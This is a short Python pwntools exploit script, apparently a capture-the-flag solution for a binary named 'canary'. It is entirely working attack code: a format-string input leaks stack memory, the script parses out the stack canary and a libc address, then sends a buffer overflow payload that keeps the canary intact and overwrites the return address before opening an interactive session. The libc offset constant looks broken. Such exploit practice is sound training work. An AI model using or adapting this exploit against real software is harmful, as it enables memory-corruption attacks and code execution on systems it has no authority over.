from pwn import *

debug = True

if debug:
    conn = process('canary')
else:
    conn = remote()

#print(conn.recv())

payload1 = b'A'* 56#50
payload2 = b'B'* 8
jump = p64(0x400787)
format_string = b'-%llx'* 17

conn.sendlineafter("name? ", format_string)
memory_leak = conn.recvuntil('Anything').decode()
print("Memory Leak: ", memory_leak)

memory_leak = memory_leak.split("\n")[0]
print(memory_leak)

memory_leak = memory_leak.strip("!").strip()
memory_leak = memory_leak.split("-")
print(memory_leak)

canary = int(memory_leak[-1], 16)
libc = int(memory_leak[4], 16)-0x140402921844488
print("Stack Canary Is: ", hex(canary))
print("Calc libc base is: ", hex(libc))

final_payload = payload1 + p64(canary) + payload2 +  jump
print("Final payload is: ", final_payload)
print(conn.recvuntil("tell me?"))
conn.send(final_payload)

#output = conn.recv()
#print(output)

print(conn.interactive())